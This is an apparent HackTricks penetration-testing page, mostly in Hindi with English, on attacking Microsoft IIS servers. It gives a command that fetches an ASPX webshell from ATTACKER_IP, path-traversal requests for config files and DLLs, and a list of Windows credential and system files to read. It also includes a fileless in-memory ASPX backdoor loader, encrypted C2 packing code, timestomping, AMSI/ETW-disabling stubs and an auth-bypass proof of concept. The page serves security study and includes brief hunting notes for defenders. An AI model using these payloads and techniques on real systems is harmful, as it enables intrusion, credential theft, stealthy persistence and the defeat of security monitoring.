# IIS - Internet Information Services

{{#include ../../banners/hacktricks-training.md}}

परीक्षण के लिए executable फ़ाइल एक्सटेंशन:

- asp
- aspx
- config
- php

## लिखने योग्य webroot → ASPX command shell

यदि किसी low-privileged user/group के पास **write access to `C:\inetpub\wwwroot`** है, तो आप एक ASPX webshell डालकर application pool identity के रूप में OS commands execute कर सकते हैं (अक्सर **SeImpersonatePrivilege** मौजूद होता है)।

- ACLs सत्यापित करें: `icacls C:\inetpub\wwwroot` or `cacls .` और अपने user/group पर `(F)` ढूँढें।
- PowerShell का उपयोग करके एक command webshell अपलोड करें (उदा., fuzzdb/tennc `cmd.aspx`):
```powershell
iwr http://ATTACKER_IP/shell.aspx -OutFile C:\inetpub\wwwroot\shell.aspx
```
- Request `/shell.aspx` and run commands; पहचान आमतौर पर दिखाती है `iis apppool\defaultapppool`.
- AppPool token में SeImpersonatePrivilege होने पर Potato-family LPE (e.g., GodPotato/SigmaPotato) के साथ मिलाकर SYSTEM पर pivot करें।

## आंतरिक IP पता खुलासा

किसी भी IIS सर्वर पर जहाँ आपको 302 मिलता है, आप Host header को हटाकर और HTTP/1.0 का उपयोग करके कोशिश कर सकते हैं और response के अंदर Location header आपको आंतरिक IP पते की ओर संकेत कर सकता है:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
आंतरिक IP का खुलासा करने वाली प्रतिक्रिया:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config फ़ाइलें निष्पादित करें

आप .config फ़ाइलें अपलोड करके उन्हें कोड निष्पादित करने के लिए उपयोग कर सकते हैं। एक तरीका यह है कि फ़ाइल के अंत में कोड को एक HTML comment के अंदर जोड़ दें: [यहाँ उदाहरण डाउनलोड करें](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

और अधिक जानकारी और इस vulnerability का शोषण करने की तकनीकें [यहाँ](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Discovery Bruteforce

उस सूची को डाउनलोड करें जिसे मैंने बनाया है:

{{#file}}
iisfinal.txt
{{#endfile}}

यह नीचे दी गई सूचियों की सामग्रियों को मिलाकर बनाया गया था:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

इन्हें किसी एक्सटेंशन को जोड़ने के बिना उपयोग करें, जिन फाइलों को एक्सटेंशन की आवश्यकता है वे पहले से ही उसमें शामिल हैं।

## Path Traversal

### Leaking source code

पूर्ण writeup देखें: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

> [!TIP]
> सारांश के रूप में, एप्लिकेशन के फ़ोल्डरों के अंदर कई web.config फ़ाइलें होती हैं जिनमें "**assemblyIdentity**" फ़ाइलों और "**namespaces**" के संदर्भ होते हैं। इन सूचनाओं से यह पता लगाया जा सकता है कि **executables कहाँ स्थित हैं** और उन्हें डाउनलोड किया जा सकता है।\
> डाउनलोड किए हुए **Dlls** से यह भी संभव है कि आप **नए namespaces** खोजें जहाँ आपको access करने और web.config फ़ाइल प्राप्त करने का प्रयास करना चाहिए ताकि नई namespaces और assemblyIdentity मिल सकें।\
> साथ ही, फ़ाइलें **connectionstrings.config** और **global.asax** भी रोचक जानकारी रख सकती हैं।

In **.Net MVC applications**, **web.config** फ़ाइल की एक महत्वपूर्ण भूमिका होती है क्योंकि यह प्रत्येक binary फ़ाइल को निर्दिष्ट करती जिस पर एप्लिकेशन निर्भर करता है, और यह **"assemblyIdentity"** XML टैग्स के माध्यम से होता है।

### **Exploring Binary Files**

An example of accessing the **web.config** file is shown below:
```html
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
यह अनुरोध विभिन्न सेटिंग्स और निर्भरताओं का खुलासा करता है, जैसे:

- **EntityFramework** संस्करण
- **AppSettings** वेबपेज, क्लाइंट वैलिडेशन, और JavaScript के लिए
- **System.web** प्रमाणन और runtime के लिए कॉन्फ़िगरेशन
- **System.webServer** मॉड्यूल सेटिंग्स
- **Runtime** assembly bindings कई लाइब्रेरीज़ के लिए जैसे **Microsoft.Owin**, **Newtonsoft.Json**, और **System.Web.Mvc**

ये सेटिंग्स संकेत देती हैं कि कुछ फाइलें, जैसे **/bin/WebGrease.dll**, एप्लिकेशन के /bin फ़ोल्डर में स्थित हैं।

### **रूट डायरेक्टरी फाइलें**

रूट डायरेक्टरी में मिली फ़ाइलें, जैसे **/global.asax** और **/connectionstrings.config** (जिसमें संवेदनशील पासवर्ड होते हैं), एप्लिकेशन के कॉन्फ़िगरेशन और संचालन के लिए आवश्यक हैं।

### **नामस्थान और Web.Config**

MVC applications विशिष्ट नामस्थान के लिए अतिरिक्त **web.config files** भी परिभाषित करते हैं ताकि प्रत्येक फ़ाइल में बार-बार घोषणाओं से बचा जा सके, जैसा कि किसी अन्य **web.config** को डाउनलोड करने के अनुरोध में दिखाया गया है:
```html
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLLs डाउनलोड करना**

कस्टम namespace का उल्लेख /bin डायरेक्टरी में मौजूद एक DLL जिसका नाम "**WebApplication1**" होने का संकेत देता है। इसके बाद **WebApplication1.dll** को डाउनलोड करने का अनुरोध दिखाया गया है:
```html
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
यह /bin डायरेक्टरी में अन्य आवश्यक DLLs, जैसे **System.Web.Mvc.dll** और **System.Web.Optimization.dll**, की मौजूदगी का संकेत देता है।

ऐसी स्थिति में जहाँ कोई DLL **WebApplication1.Areas.Minded** नामक namespace को आयात करता है, एक हमलावर अनुमान लगा सकता है कि पूर्वानुमेय पथों में अन्य web.config फ़ाइलें मौजूद हैं, जैसे **/area-name/Views/**, जो विशिष्ट कॉन्फ़िगरेशन और /bin फ़ोल्डर में अन्य DLLs के संदर्भ रखती हैं। उदाहरण के लिए, **/Minded/Views/web.config** के लिए एक अनुरोध उन कॉन्फ़िगरेशन और namespaces को उजागर कर सकता है जो किसी अन्य DLL, **WebApplication1.AdditionalFeatures.dll**, की उपस्थिति का संकेत देते हैं।

### Common files

From [here](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Error

If you see an error like the following one:

![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

यह दर्शाता है कि सर्वर ने Host header के अंदर **सही domain name प्राप्त नहीं किया**।\
वेब पेज तक पहुँचने के लिए आप सर्व किए गए **SSL Certificate** को देख सकते हैं और संभवतः वहाँ domain/subdomain नाम मिल सकता है। अगर वहा नहीं है तो आपको सही one मिलने तक **brute force VHosts** करना पड़ सकता है।

## Decrypt encrypted configuration and ASP.NET Core Data Protection key rings

IIS-hosted .NET apps पर secrets की रक्षा करने के लिए दो सामान्य पैटर्न हैं:
- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) web.config सेक्शन्स के लिए जैसे <connectionStrings>.
- ASP.NET Core Data Protection key ring (persisted locally) जो application secrets और cookies की सुरक्षा के लिए उपयोग होता है।

यदि आपके पास वेब सर्वर पर filesystem या interactive access है, तो co-located keys अक्सर डिक्रिप्शन की अनुमति देती हैं।

- ASP.NET (Full Framework) – protected config sections को aspnet_regiis के साथ डिक्रिप्ट करें:
```cmd
# Decrypt a section by app path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```
- ASP.NET Core – खोजें Data Protection key rings जो स्थानीय रूप से संग्रहीत हैं (XML/JSON files) ऐसे स्थानों पर:
- %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
- HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
- App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)

With the key ring available, an operator running in the app’s identity can instantiate an IDataProtector with the same purposes and unprotect stored secrets. Misconfigurations that store the key ring with the app files make offline decryption trivial once the host is compromised.

## IIS fileless backdoors and in-memory .NET loaders (NET-STAR style)

The Phantom Taurus/NET-STAR toolkit shows a mature pattern for fileless IIS persistence and post‑exploitation entirely inside w3wp.exe. The core ideas are broadly reusable for custom tradecraft and for detection/hunting.

Key building blocks
- ASPX bootstrapper hosting an embedded payload: एक single .aspx page (e.g., OutlookEN.aspx) में Base64‑encoded, optionally Gzip‑compressed .NET DLL एम्बेड किया जाता है। trigger request पर यह decode, decompress और reflectively load करके current AppDomain में लोड करता है और main entry point (e.g., ServerRun.Run()) को invoke करता है।
- Cookie‑scoped, encrypted C2 with multi‑stage packing: tasks/results को Gzip → AES‑ECB/PKCS7 → Base64 से wrap किया जाता है और seemingly legitimate cookie‑heavy requests के माध्यम से भेजा जाता है; operators ने chunking के लिए stable delimiters (e.g., "STAR") का उपयोग किया।
- Reflective .NET execution: arbitrary managed assemblies को Base64 के रूप में स्वीकार किया जाता है, Assembly.Load(byte[]) के माध्यम से लोड किया जाता है और operator args पास करके बिना disk को छुए rapid module swaps संभव होते हैं।
- Operating in precompiled ASP.NET sites: साइट precompiled होने पर भी auxiliary shells/backdoors जोड़े/मैनेज किए जा सकते हैं (e.g., dropper dynamic pages/handlers जोड़ता है या config handlers का लाभ उठाता है) – ये bypassPrecompiledApp, addshell, listshell, removeshell जैसे commands से expose होते हैं।
- Timestomping/metadata forgery: deployment पर changeLastModified action और timestomp को expose किया जाता है (future compilation timestamps सहित) ताकि DFIR को बाधित किया जा सके।
- Optional AMSI/ETW pre‑disable for loaders: second‑stage loader Assembly.Load कॉल करने से पहले AMSI और ETW को disable कर सकता है ताकि in‑memory payloads की inspection घटे।

Minimal ASPX loader pattern
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
// 1) Obtain payload bytes (hard‑coded blob or from request)
string b64 = /* hardcoded or Request["d"] */;
byte[] blob = Convert.FromBase64String(b64);
// optional: decrypt here if AES is used
using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
using(var ms = new MemoryStream()){
gz.CopyTo(ms);
var asm = Assembly.Load(ms.ToArray());
// 2) Invoke the managed entry point (e.g., ServerRun.Run)
var t = asm.GetType("ServerRun");
var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
object inst = m.IsStatic ? null : Activator.CreateInstance(t);
m.Invoke(inst, new object[]{ HttpContext.Current });
}
}
}
</script>
```
Packing/crypto हेल्पर्स (Gzip + AES‑ECB + Base64)
```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
using(var aes = Aes.Create()){
aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
return t.TransformFinalBlock(data, 0, data.Length);
}
}

static string Pack(object obj, byte[] key){
// serialize → gzip → AES‑ECB → Base64
byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
using var ms = new MemoryStream();
using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
byte[] enc = AesEcb(ms.ToArray(), key, true);
return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
byte[] enc = Convert.FromBase64String(b64);
byte[] cmp = AesEcb(enc, key, false);
using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
using var outMs = new MemoryStream(); gz.CopyTo(outMs);
return Deserialize<T>(outMs.ToArray());
}
```
Cookie/session flow and command surface
- Session bootstrap और tasking cookies के माध्यम से किए जाते हैं ताकि वे सामान्य वेब गतिविधि में घुल‑मिल जाएँ।
- वास्तविक मामलों में देखे गए Commands में शामिल थे: fileExist, listDir, createDir, renameDir, fileRead, deleteFile, createFile, changeLastModified; addshell, bypassPrecompiledApp, listShell, removeShell; executeSQLQuery, ExecuteNonQuery; और dynamic execution primitives code_self, code_pid, run_code for in‑memory .NET execution.

Timestomping utility
```csharp
File.SetCreationTime(path, ts);
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```
Assembly.Load से पहले इनलाइन AMSI/ETW अक्षम करें (loader variant)
```csharp
// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
// and ntdll!EtwEventWrite to a stub; then load operator assembly
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```
देखें AMSI/ETW bypass techniques in: windows-hardening/av-bypass.md

हंटिंग नोट्स (रक्षक)
- Single, odd ASPX page with very long Base64/Gzip blobs; cookie‑heavy posts.
- Unbacked managed modules inside w3wp.exe; strings like Encrypt/Decrypt (ECB), Compress/Decompress, GetContext, Run.
- Repeated delimiters like "STAR" in traffic; mismatched or even future timestamps on ASPX/assemblies.

## Telerik UI WebResource.axd unsafe reflection (CVE-2025-3600)

Many ASP.NET apps embed Telerik UI for ASP.NET AJAX and expose the unauthenticated handler Telerik.Web.UI.WebResource.axd. When the Image Editor cache endpoint is reachable (type=iec), the parameters dkey=1 and prtype enable unsafe reflection that executes any public parameterless constructor pre‑auth. This yields a universal DoS primitive and can escalate to pre‑auth RCE on apps with insecure AppDomain.AssemblyResolve handlers.

See detailed techniques and PoCs here:

{{#ref}}
telerik-ui-aspnet-ajax-unsafe-reflection-webresource-axd.md
{{#endref}}

## Old IIS vulnerabilities worth looking for


### Microsoft IIS tilde character “\~” Vulnerability/Feature – Short File/Folder Name Disclosure

You can try to **enumerate folders and files** inside every discovered folder (even if it's requiring Basic Authentication) using this **technique**.\
The main limitation of this technique if the server is vulnerable is that **it can only find up to the first 6 letters of the name of each file/folder and the first 3 letters of the extension** of the files.

You can use [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) to test for this vulnerability:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../images/image (844).png>)

Original research: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

You can also use **metasploit**: `use scanner/http/iis_shortname_scanner`

A nice idea to **find the final name** of the discovered files is to **ask LLMs** for options like it's done in the script [https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py)

### Basic Authentication bypass

**Bypass** a basic authentication (**IIS 7.5**) trying to access: `/admin:$i30:$INDEX_ALLOCATION/admin.php` or `/admin::$INDEX_ALLOCATION/admin.php`

You can try to **mix** this **vulnerability** and the last one to find new **folders** and **bypass** the authentication.

## ASP.NET Trace.AXD enabled debugging

ASP.NET include a debugging mode and its file is called `trace.axd`.

It keeps a very detailed log of all requests made to an application over a period of time.

This information includes remote client IP's, session IDs, all request and response cookies, physical paths, source code information, and potentially even usernames and passwords.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH uses the following info:

- **`validationKey`** (string): hex-encoded key to use for signature validation.
- **`decryptionMethod`** (string): (default “AES”).
- **`decryptionIV`** (string): hex-encoded initialization vector (defaults to a vector of zeros).
- **`decryptionKey`** (string): hex-encoded key to use for decryption.

हालाँकि, कुछ लोग इन पैरामीटरों के **default values** का उपयोग करेंगे और **cookie के रूप में उपयोगकर्ता का email** उपयोग करेंगे। इसलिए, यदि आप वही प्लेटफ़ॉर्म इस्तेमाल करने वाली किसी वेब साइट को पा लेते हैं जो ASPXAUTH cookie का उपयोग कर रही हो और आप हमले के निशाने पर सर्वर पर उस उपयोगकर्ता के email के साथ एक यूज़र बना दें, तो आप दूसरे सर्वर के cookie को पहले सर्वर में इस्तेमाल करके उपयोगकर्ता की नक़ल कर पाएंगे।\
यह हमला इस [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19) में काम कर गया था।

## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): A bug in the code **didn't properly check for the password given by the user**, so an attacker whose **password hash hits a key** that is already in the **cache** will be able to login as that user .
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
## संदर्भ

- [0xdf – HTB Job (IIS write → ASPX shell → GodPotato)](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Unit 42 – Phantom Taurus: एक नया चीनी Nexus APT और NET-STAR Malware Suite की खोज](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [AMSI/ETW bypass पृष्ठभूमि (HackTricks)](../../windows-hardening/av-bypass.md)

{{#include ../../banners/hacktricks-training.md}}
